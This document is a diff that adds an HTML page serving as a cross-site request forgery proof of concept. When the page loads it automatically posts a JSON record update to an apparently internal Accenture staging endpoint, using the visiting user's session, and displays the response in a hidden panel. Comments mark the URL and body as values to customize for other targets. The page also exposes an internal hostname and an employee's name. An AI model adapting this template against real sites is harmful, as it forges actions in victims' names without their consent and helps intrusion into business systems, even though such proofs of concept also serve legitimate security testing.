@@ -1,0 +1,115 @@
+<!-- Script 1 – Script to use XMLHTTPRequest to perform a POST on behalf of the end-user. Comments have been added where modifications are required. -->
+<html>
+	<head>
+		<script type="text/javascript">
+		function dts(data)
+		{
+		   var body, xhr;
+
+		   // ================================================================================
+		   // Get xml http request object.
+		   // ================================================================================
+		   
+		   // code for IE7+, Firefox, Chrome, Opera, Safari
+		   if (window.XMLHttpRequest)
+				  xhr=new XMLHttpRequest();
+		   else
+			  // code for IE6, IE5
+			  xhr=new ActiveXObject("Microsoft.XMLHTTP");
+			
+		   xhr.onreadystatechange=
+			  function()
+			  {
+				  if (xhr.readyState==4 && xhr.status==200)
+				  {
+					  if (xhr.responseText.length <= 0)
+						document.getElementById("output").innerHTML="Request Failed to Process. No data returned.";
+					  else
+						document.getElementById("output").innerHTML="Referrer: " + document.referrer + "<br>" + formatJson(xhr.responseText);
+				  }
+				  else if(xhr.readyState==4 && xhr.status==0)
+				  {
+					  if (xhr.responseText.length <= 0)
+						document.getElementById("output").innerHTML="Request Failed to Process. No data returned.";
+					  // else
+					  // junk....
+				  }    
+				  else
+					  ; //alert (xhr.readyState + " " + xhr.status);
+				  
+			  }; 
+
+			  // Set the body of the Post Request here -------------------------------- CUSTOMIZE VALUES BELOW---------------------------------------------
+			  body = '{"Id":762,"OpportunityId":171712,"StatusCd":"01001","LeadPeopleId":"22","NotesTxt":"This is a test from CSRF Random
+					  Number: ' + Math.floor(Math.random()*100) +   
+						 '","SupportDueDt":"06/13/2011","PrimaryPlatformCd":"02001","DebriefStatusCd":"06001","RatesProvided":true,"BlackHatCoordinated":false,"RatesCaptured":false,"Contributors":[],"ServiceLineSupported":[{"EntityId":1,"SubEntityNbr":0,"SubEntityCd":"08001","SubEntityValue":""}],"CompetitorsSupported":[],"FinalHeadToHead":[],"AuditMessage":"Last Updated by dimitrios.a.kapsalis on 06/14/2011 17:39:41","FinalHeadToHeadAuditMessage":"","LeadPeopleEnterpriseId":""}';    
+
+			// Set the URL to post to. -------------------------------- CUSTOMIZE VALUES BELOW---------------------------------------------
+			xhr.open("POST", "https://xyz.ciostage.accenture.com/ServiceRef.svc/ajaxEndPoint/CAISave", true);
+			
+			// Set the content-type accordingly. -------------------------------- CUSTOMIZE VALUES BELOW---------------------------------------------
+			xhr.setRequestHeader("Content-Type", "application/json; charset=utf-8");
+			xhr.send(body);
+		}
+
+		// formatJson() :: formats and indents JSON string
+		function formatJson(val) 
+		{
+			var retval = "";
+			var str = val;
+			var pos = 0;
+			var strLen = str.length;
+			var indentStr = "&nbsp;&nbsp;&nbsp;&nbsp;";
+			var newLine = "<br />";
+			var char = "";
+
+			for (var i=0; i<strLen; i++) 
+			{
+			  char = str.substring(i,i+1);
+
+			  if (char == "}" || char == "]") {
+				retval = retval + newLine;
+				pos = pos - 1;
+
+			  for (var j=0; j<pos; j++) {
+				 retval = retval + indentStr;
+			  }
+			}
+
+			retval = retval + char;
+
+			if (char == "{" || char == "[" || char == ",") 
+			{
+				retval = retval + newLine;
+
+				if (char == "{" || char == "[") {
+					pos = pos + 1;
+				}
+
+				for (var k=0; k<pos; k++){
+					retval = retval + indentStr;
+				}
+			}
+		  }
+		   return retval;
+		}
+
+		function toggle() 
+		{
+			var ele = document.getElementById("output");
+
+			if(ele.style.display == "block") 
+				ele.style.display = "none";
+			else 
+			   ele.style.display = "block";
+		} 
+		</script>
+	</head>
+	<body onload="dts();">
+		  <div id="image">
+				<img src="http://www.google.com/images/logos/ps_logo2.png" />
+		  </div>
+		  <a id="displayText" href="javascript:toggle();">show</a>
+		  <div id="output" style="display: none"></div>
+	</body>
+</html>
